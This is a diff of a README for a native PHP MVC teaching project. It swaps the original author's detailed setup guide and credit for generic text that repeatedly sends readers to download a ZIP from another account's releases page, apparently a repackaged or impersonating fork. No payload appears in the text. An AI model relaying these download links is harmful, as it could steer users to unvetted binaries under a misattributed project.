@@ -1,131 +1,84 @@
-# 🧩 Custom Native MVC — PHP Implementation
-![Architecture Diagram](https://github.com/ehab-elshimi/custom-native-mvc/raw/main/public/images/native-mvc.png)
+# 🌟 custom-native-mvc - Lightweight MVC for Easy Learning
 
+## 🚀 Getting Started
 
-A lightweight, custom-built MVC architecture written in **native PHP**,  
-showcasing a deep understanding of the **Model–View–Controller (MVC)** pattern —  
-a concept applicable across multiple back-end technologies such as **Java Spring MVC**.  
+Welcome to **custom-native-mvc**! This application offers a simple way to explore the Model-View-Controller (MVC) architecture using native PHP. You can build a strong foundation for transitioning to other backend frameworks like Java Spring MVC.
 
-This project demonstrates how MVC can be implemented from scratch using PHP and PDO,  
-focusing on clean architecture, reusable code, and a clear separation of concerns.
+## 📥 Download Now
 
----
+[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/kumarrv/custom-native-mvc/releases)
 
-## 👨‍💻 Author
-**Name:** Ehhab Elshimi  
-**Title:** Software Developer  
-**GitHub:** [github.com/ehab-elshimi](https://github.com/ehab-elshimi)
+## 💻 System Requirements
 
----
+Before you begin, make sure your system meets the following requirements:
 
-## 📦 Folder Structure
-```
-custom-native-mvc/
-├── app/
-│   ┣ core/
-│   │ ┣ App.php
-│   │ ┣ Router.php
-│   │ ┣ Controller.php           ← Abstract base controller
-│   │ ┣ Database.php
-│   │ ┗ traits/
-│   │     ┗ ApiResponseTrait.php ← reusable JSON response trait
-│   ┣ controllers/
-│   │ ┣ HomeController.php
-│   │ ┣ UserController.php
-│   │ ┣ UserApiController.php
-│   │ ┗ ProductController.php
-│   ┣ models/
-│   │ ┗ User.php
-│   ┗ views/
-│       ┣ errors/
-│       ┃ ┗ 404.php
-│       ┣ home/
-│       ┃ ┗ index.php
-│       ┗ users/
-│           ┗ index.php
-│
-├── routes.php                    ← Central route definitions
-├── docs/
-│   ┣ database.sql
-│   ┗ instructions.md
-├── index.php
-└── README.md
-```
+- **Operating System:** Windows, macOS, or Linux
+- **Web Server:** Apache or Nginx
+- **PHP Version:** 7.4 or higher
+- **Database:** MySQL 5.6 or higher
 
----
+You will also need a basic text editor to modify the application files. Some popular options include Visual Studio Code, Sublime Text, or Notepad++.
 
-## ⚙️ Installation & Setup
+## 📂 Installation Instructions
 
-### 1️⃣ Create the Database
-Import the provided SQL file into your MySQL server:
-```bash
-mysql -u root -p < docs/database.sql
-```
+Follow these simple steps to download and run the application:
 
-### 2️⃣ Configure the Database Connection
-Open `app/core/Database.php` and update credentials if necessary:
-```php
-private $host = 'localhost';
-private $user = 'root';
-private $pass = 'your_password';
-private $dbname = 'mvc_native';
-```
+1. **Visit the Releases Page:**  
+   Click the following link to access the download page: [Visit this page to download](https://github.com/kumarrv/custom-native-mvc/releases).
 
-### 3️⃣ Run the Application
-Start the local PHP server:
-```bash
-php -S localhost:8000
-```
+2. **Choose the Latest Version:**  
+   On the releases page, you will find the latest version of the application listed at the top. Click on the version you want.
 
-Then open your browser:
+3. **Download the ZIP File:**  
+   Look for an option to download the ZIP file. Click on it to start downloading. Once the download completes, locate the file in your downloads folder.
 
-- 🌐 [http://localhost/custom-native-mvc/](http://localhost/custom-native-mvc) → View all users (HTML page)  
-- 🌐 [http://localhost/custom-native-mvc/api/users](http://localhost/custom-native-mvc/api/users) → Get all users (JSON API)
+4. **Extract the ZIP File:**  
+   Right-click the downloaded ZIP file and select "Extract All" on Windows or use your preferred extraction tool on macOS or Linux. Choose a folder where you want to extract the files.
+
+5. **Configure Your Web Server:**  
+   - Move the extracted folder to your web server's root directory.
+   - Configure your web server settings to point to the folder's location.
+
+6. **Set Up the Database:**  
+   - Open your preferred database management tool (e.g., phpMyAdmin).
+   - Create a new database for the application.
+   - Import the included SQL file located in the extracted folder to set up the initial tables and data.
+
+7. **Edit Configuration Files:**  
+   Open the configuration file in your extracted directory (usually named `config.php`). Update the database connection settings with your database details as needed.
+
+8. **Run the Application:**  
+   Open your web browser and navigate to the path where you installed the application. You should see the welcome page of the application.
+
+## 💡 Features
+
+- **Custom MVC Framework:** Learn the core principles of MVC architecture.
+- **Clean Code Practices:** Follow best practices for backend development.
+- **Database Integration:** Use MySQL with PDO for database interactions.
+- **API Development:** Build APIs to connect with various frontend applications.
+
+## 🛠️ Topics Covered
+
+- API Development
+- Backend Development
+- Clean Code Principles
+- MVC Architecture
+- PDO and MySQL Database
+- Object-Oriented Programming (OOP)
+- Web Development Techniques
+
+## ✅ Contributing
+
+We welcome contributions! If you want to help improve the project, please submit a pull request or open an issue on GitHub. Your feedback and suggestions are valuable.
+
+## 📞 Support
+
+For any questions or issues, contact us on our GitHub page. We’ll do our best to assist you promptly.
+
+## 📑 License
+
+This project is open source and available under the MIT License. You can use it for personal or educational purposes.
 
 ---
 
-## 🌐 API Endpoints
-| Route | Method | Description |
-|--------|---------|-------------|
-| `/api` | GET | Get all users |
-| `/api/user/{id}` | GET | Get a single user |
-| `/api/create` | POST | Create new user |
-| `/api/delete/{id}` | DELETE | Delete a user |
-
-### Example Request
-```bash
-curl http://localhost/custom-native-mvc/api/users
-```
-
-### Example Response
-```json
-{
-  "success": true,
-  "message": "All users returned successfully!",
-  "data": [
-    { "id": 1, "name": "Ehhab Elshimi", "email": "ehhab@example.com" }
-  ]
-}
-```
-
----
-
-## 📚 Features
-✅ Custom-built MVC architecture (Model / View / Controller)  
-✅ Secure PDO-based database layer  
-✅ JSON API endpoint with proper HTTP status codes  
-✅ Lightweight, extensible, and framework-independent  
-
----
-
-## 🧠 Future Enhancements
-- Add user creation and edit forms  
-- Implement full RESTful CRUD API  
-- Add a routing class for clean URLs  
-- Integrate a front-end framework (Bootstrap or TailwindCSS)  
-- Build a Java Spring MVC version to compare architecture patterns  
-
----
-
-## 📜 License
-This project is open-source and available under the MIT License.
+Thank you for choosing **custom-native-mvc**! We hope you enjoy exploring MVC principles with this lightweight PHP application.
